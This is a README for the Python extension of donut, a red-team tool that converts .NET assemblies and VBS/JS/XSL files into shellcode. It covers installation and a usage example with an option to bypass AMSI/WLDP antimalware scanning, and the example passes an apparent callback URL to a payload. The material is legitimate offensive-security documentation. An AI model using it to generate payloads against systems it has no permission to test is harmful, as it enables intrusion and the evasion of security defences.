# Python Extension

A Python C extension is now available which allows you to dynamically generate donut shellcode in Python.

## Requirements

The extension has only been tested in Python 3.7, it shouldn't have any compatibility issues with older 3.X versions of Python.

It will ***not*** work in Python 2.x.

## Installing the Extension

(Once the extension has been published to PyPi)
```
pip3 install donut-shellcode
```

## Manually Compiling And Installing the Extension

```bash
git clone https://github.com/TheWover/donut && cd donut
pip3 install . # or python setup.py install
```

## Usage

The Python extension accepts the same parameters as the main donut executable.

Here's a minimalistic example of using the extension:

```python
import donut
shellcode = donut.create(file="naga.exe", params='https://172.16.164.1/')
```

The ```donut``` module exposes only one function ```create()```, which is used to generate shellcode and accepts both positional and keyword arguments.

The only required parameter the ```create()``` function needs is the ```file``` argument which accepts a path to the .NET EXE/DLL or VBS/JS/XSL file to turn into shellcode.

```python
import donut

shellcode = donut.create(
    file='naga.exe',         # .NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory
    url='http://127.0.0.1',  # HTTP server that will host the donut module
    arch=1,                  # Target architecture : 1=x86, 2=amd64, 3=amd64+x86(default)
    bypass=3,                # Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.(default)
    cls='namespace.class',   # Optional class name.  (required for .NET DLL)
    method='method',         # Optional method or API name for DLL. (method is required for .NET DLL)
    params='arg1,arg2',      # Optional parameters or command line, separated by comma or semi-colon.
    runtime='version',       # CLR runtime version. MetaHeader used by default or v4.0.30319 if none available
    appdomain='name'         # AppDomain name to create for .NET. Randomly generated by default.
)
```

## Author

The Python extension was written by [@byt3bl33d3r](https://twitter.com/byt3bl33d3r)
